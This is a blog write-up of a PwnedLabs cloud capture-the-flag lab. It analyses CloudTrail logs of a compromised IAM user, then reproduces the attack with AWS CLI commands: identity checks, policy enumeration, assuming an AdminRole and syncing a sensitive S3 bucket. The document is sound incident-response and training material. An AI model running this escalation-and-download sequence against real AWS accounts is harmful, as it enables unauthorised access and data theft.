---
author: Nithissh
pubDatetime: 2024-02-09T15:22:00.000Z
title: "Breach in the Cloud - Cloudtrial challenge"
featured: false
draft: false
tags:
  - pwnedlabs
description: "This is a challenge from pwnedlabs where I've been provided with the cloudtrial logs and from there I've to do log analysis and trying to reproduce the attack from the attacker perspective"
---

### Scenario

We've been alerted to a potential security incident. The Huge Logistics security team have provided you with AWS keys of an account that saw unusual activity, as well as AWS CloudTrail logs around the time of the activity. We need your expertise to confirm the breach by analyzing our CloudTrail logs, identifying the compromised AWS service and any data that was exfiltrated.

  

### Things provided in the lab

| Access Key ID | AKIARSXXXXX4RO4P4 |
| --- | --- |
| **Secret Access Key** | **Wv7hFXXXXXXXXXr0az/XgzjxK7QJ** |

  

### Solution

They also provided with `case-zip` file from their discord server and unzipping it listed out cloudtrail logs in json format

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ ls
107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json
107513503799_CloudTrail_us-east-1_20230826T2040Z_UkDeakooXR09uCBm.json 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json
107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json
107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json INCIDENT-3252.zip
```

  

Examining the file in a text editor like Nano or Vim unveils that the JSON files lack proper formatting, making them challenging to read. To enhance readability, we can employ `jq`, a command-line JSON processor designed for parsing and structuring data. If jq is not already installed, you can install it using the command `apt install jq`. Subsequently, execute the following command in the current directory housing the JSON files.

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json | jq

{
"Records": [
{
"eventVersion": "1.09",
"userIdentity": {
"type": "Root",
"principalId": "107513503799",
"arn": "arn:aws:iam::107513503799:root",
"accountId": "107513503799",
"accessKeyId": "ASIA_REDACTED_KEY_02",
"sessionContext": {
"attributes": {
"creationDate": "2023-08-26T18:45:20Z",
"mfaAuthenticated": "false"
}
}
},
"eventTime": "2023-08-26T20:28:18Z",
"eventSource": "s3.amazonaws.com",
"eventName": "ListBuckets",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.11",
"userAgent": "[S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.488 Linux/5.10.186-157.751.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.372-b08 java/1.8.0_372 vendor/Oracle_Corporation cfg/retry-mode/standard]",
"requestParameters": {
"Host": "s3.amazonaws.com"
},
```

  

Observing the CloudTrail logs, we observe that the file names include the creation time and are arranged chronologically. The earliest timestamp is `T2035`, so we'll initiate our investigation from that point. Our suspicion is centered around the temp-user account, and we'll use the `` `grep` `` command to search for occurrences of `"temp-user"` in the files.

  

```json
{
"eventVersion": "1.08",
"userIdentity": {
"type": "IAMUser",
"principalId": "AIDARSCCN4A3X2YWZ37ZI",
"arn": "arn:aws:iam::107513503799:user/temp-user",
"accountId": "107513503799",
"accessKeyId": "AKIA_REDACTED_KEY_03",
"userName": "temp-user"
},
"eventTime": "2023-08-26T20:29:37Z",
"eventSource": "sts.amazonaws.com",
"eventName": "GetCallerIdentity",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.19",
"userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",
"requestParameters": null,
"responseElements": null,
"requestID": "3db296ab-c531-4b4a-a468-e1b05ec83246",
"eventID": "ea6ae4b8-aae8-4fca-a495-2df427bdce46",
"readOnly": true,
"eventType": "AwsApiCall",
"managementEvent": true,
"recipientAccountId": "107513503799",
"eventCategory": "Management",
"tlsDetails": {
"tlsVersion": "TLSv1.2",
"cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
"clientProvidedHostHeader": "sts.amazonaws.com"
}
},
```

  

This uncovers that an IAM user named "temp-user," identified by the globally unique ARN (Amazon Resource Name) `arn:aws:iam::107513503799:user/temp-user` from the AWS account `107513503799`, executed the CLI command `aws sts get-caller-identity` on 2023-08-26T20:29:37Z.

  

The `GetCallerIdentity` action within AWS Security Token Service (STS) allows users to retrieve information about the IAM identity associated with the credentials used for the API request. It can be likened to the "whoami" command in Windows and Linux. The command yields the globally unique ARN and, if applicable, the ARN of the assumed IAM role. Although commonly used, malicious actors may exploit it to ascertain the principal (IAM user or role) linked to compromised credentials, aiding in situational awareness.

  

The request originated from the IP address `84.32.71.19`. Investigation into this IP discloses that the request emanated from Turkey. Notably, Turkey is not a location where Huge Logistics has a technical presence, raising concerns of a potential compromise. Further exploration is warranted.

  

```json
{
"ip": "84.32.71.19",
"city": "Ankara",
"region": "Ankara",
"country": "TR",
"loc": "39.9199,32.8543",
"org": "AS137409 GSL Networks Pty LTD",
"postal": "06420",
"timezone": "Europe/Istanbul",
"readme": "https://ipinfo.io/missingauth"
}
```

  

Shifting our focus to the subsequent file, a preliminary examination indicates that the `temp-user` account attempted, without success, to list the contents of a bucket named `emergency-data-recovery`⁠

  

```json
{
"Records": [
{
"eventVersion": "1.09",
"userIdentity": {
"type": "IAMUser",
"principalId": "AIDARSCCN4A3X2YWZ37ZI",
"arn": "arn:aws:iam::107513503799:user/temp-user",
"accountId": "107513503799",
"accessKeyId": "AKIA_REDACTED_KEY_03",
"userName": "temp-user"
},
"eventTime": "2023-08-26T20:35:56Z",
"eventSource": "s3.amazonaws.com",
"eventName": "ListObjects",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.33",
"userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",
"errorCode": "AccessDenied",
"errorMessage": "Access Denied",
"requestParameters": {
"list-type": "2",
"bucketName": "emergency-data-recovery",
"encoding-type": "url",
"prefix": "",
"delimiter": "/",
"Host": "emergency-data-recovery.s3.amazonaws.com"
}
```

  

Analyzing the next log file for a error message, reveals that the attacker tried to enumerate other AWS services as well using tools like `pacu` and `awsenumerator` or `prowler` where it makes alot of noise and provided with 450 denied requests

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | jq | grep temp-user
"arn": "arn:aws:iam::107513503799:user/temp-user",
"userName": "temp-user"
"arn": "arn:aws:iam::107513503799:user/temp-user",
"userName": "temp-user"
"errorMessage": "User: arn:aws:iam::107513503799:user/temp-user is not authorized to perform: backup:ListProtectedResources because no identity-based policy allows the backup:ListProtectedResources action",
"arn": "arn:aws:iam::107513503799:user/temp-user",
"userName": "temp-user"
"errorMessage": "User: arn:aws:iam::107513503799:user/temp-user is not authorized to perform: autoscaling:DescribeMetricCollectionTypes because no identity-based policy allows the autoscaling:DescribeMetricCollectionTypes action",
"arn": "arn:aws:iam::107513503799:user/temp-user",
```

  

Also like if you only wanted to grep for `errorMessage` there are 450 denied requests

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | jq | grep errorMessage | wc -l
450
```

  

Reviewing the following log file and once more scrutinizing actions initiated by the user, it becomes evident that they successfully assumed the role named "AdminRole." The AssumeRole operation within AWS Security Token Service (STS) enables an AWS identity to adopt a different privilege context for a limited duration, potentially granting access to resources beyond the usual scope of the assuming principal.

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json | grep -A 30 temp-user | jq
{
"eventVersion": "1.08",
"userIdentity": {
"type": "IAMUser",
"principalId": "AIDARSCCN4A3X2YWZ37ZI",
"arn": "arn:aws:iam::107513503799:user/temp-user",
"accountId": "107513503799",
"accessKeyId": "AKIA_REDACTED_KEY_03",
"userName": "temp-user"
},
"eventTime": "2023-08-26T20:54:28Z",
"eventSource": "sts.amazonaws.com",
"eventName": "AssumeRole",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.33",
"userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",
"requestParameters": {
"roleArn": "arn:aws:iam::107513503799:role/AdminRole",
"roleSessionName": "MySession"
},
"responseElements": {
"credentials": {
"accessKeyId": "ASIARSCCN4A3QPI4OFEH",
"sessionToken": "FwXXXXXXXXv3uxGSKtAdXv/PRPh9ethHcIcepNJc378mcwNGcUmj+QPKJVVNP95zUUJ6XXXXXX0Zk1FXnxatd6KNTB4U=",
"expiration": "Aug 26, 2023, 9:54:28 PM"
},
```

  

Analysis of the subsequent file exposes that the attacker once again utilized the `aws sts get-caller-identity` command to confirm their updated execution context. This suggests an ongoing effort to validate and maintain control over the assumed role and associated privileges.

  

```sh
"eventTime": "2023-08-26T20:59:54Z",
"eventSource": "sts.amazonaws.com",
"eventName": "GetCallerIdentity",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.36",
"userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",
"requestParameters": null,
"responseElements": null,
"requestID": "4afc1ae7-cac8-4a12-bf61-5d2b08c5aa46",
"eventID": "010387ea-2bc8-45fb-8c5a-8ba865492209",
"readOnly": true,
"eventType": "AwsApiCall",
"managementEvent": true,
"recipientAccountId": "107513503799",
"eventCategory": "Management",
"tlsDetails": {
"tlsVersion": "TLSv1.2",
"cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
"clientProvidedHostHeader": "sts.amazonaws.com"
}
```

  

Taking note of their prior focus on the "emergency-data-recovery" S3 bucket, it appears that the attacker made another attempt to list and retrieve the contents of the bucket. Their persistent interest in this specific resource raises concerns and underscores the need for thorough investigation and remediation.

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json | jq | grep -A 10 eventName
"eventName": "ListObjects",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.125",
"userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",
"requestParameters": {
"list-type": "2",
"bucketName": "emergency-data-recovery",
"encoding-type": "url",
"prefix": "",
"delimiter": "/",
"Host": "emergency-data-recovery.s3.amazonaws.com"
--
"eventName": "GetObject",
"awsRegion": "us-east-1",
"sourceIPAddress": "84.32.71.3",
"userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",
"requestParameters": {
"bucketName": "emergency-data-recovery",
"Host": "emergency-data-recovery.s3.amazonaws.com",
"key": "emergency.txt"
},
"responseElements": null,
"additionalEventData": {
```

### Reproducing it in Attacker standpoint

The Lab provided us with set of credentials, we have configured it and sent a `getCallerIdentity` reveals that these credentials belongs to a `temp-user`⁠

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws configure
AWS Access Key ID [****************WZOD]: AKIA_REDACTED_KEY_03
AWS Secret Access Key [****************q9e/]: SECRET_KEY_REDACTED_03
Default region name [us-east-1]:
Default output format [None]:
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws sts get-caller-identity
{
"UserId": "AIDARSCCN4A3X2YWZ37ZI",
"Account": "107513503799",
"Arn": "arn:aws:iam::107513503799:user/temp-user"
}
```

  

Enumerating iam inline policy reveals that the user `temp-user` attached to the policy called `test-temp-user` where as the policy have the permission to allow the user to assume as `AdminRole`⁠

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws iam list-user-policies --user-name temp-user
{
"PolicyNames": [
"test-temp-user"
]
}

nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
{
"UserName": "temp-user",
"PolicyName": "test-temp-user",
"PolicyDocument": {
"Version": "2012-10-17",
"Statement": [
{
"Sid": "VisualEditor0",
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Resource": "arn:aws:iam::107513503799:role/AdminRole"
}
]
}
}
```

  

To assume the role, run the aws configure command with the AccessKeyId and SecretAccessKey from the previous step. To set the token, run the command: `aws configure set aws_session_token "<SessionToken>"`. With that completed, we can run the command aws sts get-caller-identity to verify our new context.

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws configure --profile MySession
AWS Access Key ID [None]: ASXXXXXXXX6SPPKZMQ
AWS Secret Access Key [None]: i3zXXXXXXXXX1hMLsunEvsVxnGHu
Default region name [None]:
Default output format [None]:
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws sts get-caller-identity
{
"UserId": "AIDARSCCN4A3X2YWZ37ZI",
"Account": "107513503799",
"Arn": "arn:aws:iam::107513503799:user/temp-user"
}


nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws configure --profile MySession
AWS Access Key ID [****************KZMQ]: ASIXXXXXXXPKZMQ
AWS Secret Access Key [****************nGHu]: i3z3fXXXXXXXXunEvsVxnGHu
Default region name [us-east-1]:
Default output format [None]:
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws configure set aws_session_token "FwoGZXIvYXdzED8aDDZ5VQCreHbUQ5Z3oyKtAY1o7HfI19KFwef+EbXFeI/a8J/naQ8On8ZugLpnIal/WOCv5IXnv4BgyLDL1TV/XgoiYGKNOXLNi/6A/eXNJZo5v90O31MyNeumZvNp5qVWv1hAZb3+SdukVSjWZhOYyvewhnY1vGsHiqrO4fwpexdvnZz6odTXoxNjQaLjvScoLr/03qOxxOYtLzkYd3Xy/wzZO5vJTxWJVQaRofPwpyhHRI/6PPf5DOaRcVBfKPOXtKwGMi2YxCVDFsxHZD3jvimnShh/xhvYAl2QTGxXY5xbFnwoSu6bgSBLN+mnQ80Khx8=" --profile MySession

nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws sts get-caller-identity --profile MySession
{
"UserId": "AROARSCCN4A34V23XHK6I:MySession",
"Account": "107513503799",
"Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
}
```

  

Now we can get list and get the files from s3 bucket called `emergency-data-recovery` and dump it out

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws s3 ls s3://emergency-data-recovery --profile "MySession"
2023-08-27 02:37:50 2232 emergency.txt
2023-08-27 03:49:02 236 message.txt

nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ aws s3 sync s3://emergency-data-recovery/ ./ --profile "MySession"
download: s3://emergency-data-recovery/message.txt to ./message.txt
download: s3://emergency-data-recovery/emergency.txt to ./emergency.txt
```

  

Opening the `emergency.txt` reveals that we got our flag and it is also disclosing alot of Internal credentials of various departments

  

```sh
nithi@DESKTOP-BS5JG3U:~/workspace/Learning/PwnedLabs.io/Breach-In-The-Cloud$ cat emergency.txt
=========== Huge Logistics Emergency Recovery Plan ===========
flag: 3eb222cf55522f0f321f1ed5ed9a3663
```